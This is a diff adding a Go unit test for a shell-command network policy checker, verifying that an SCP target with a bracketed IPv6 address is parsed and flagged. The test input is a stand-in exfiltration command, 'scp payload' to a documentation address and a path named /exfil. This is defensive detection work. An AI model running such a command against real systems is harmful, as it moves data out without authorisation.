@@ -864,6 +864,18 @@ func TestCoverrules_RuleNetwork_SCPLikeSSHURL(t *testing.T) {
 	require.Contains(t, ids, "network.non_whitelisted_domain")
 }
 
+// TestCoverrules_RuleNetwork_BracketedIPv6 verifies that an SCP-style
+// bracketed IPv6 target reaches the network policy instead of being
+// truncated and dropped during token classification.
+func TestCoverrules_RuleNetwork_BracketedIPv6(t *testing.T) {
+	p := DefaultPolicy()
+	a := analyzeShell("scp payload 'user@[2001:db8::1]:/exfil'")
+	require.NotEmpty(t, a.NetworkTargets)
+	require.Equal(t, "2001:db8::1", a.NetworkTargets[0].Host)
+	ids := ruleIDSet(ruleNetwork(&a, p))
+	require.Contains(t, ids, "network.malformed_target")
+}
+
 // TestCoverrules_RuleNetwork_TrailingDotHost verifies that a single
 // trailing dot (the DNS root label) still matches the bare allowlisted
 // domain.
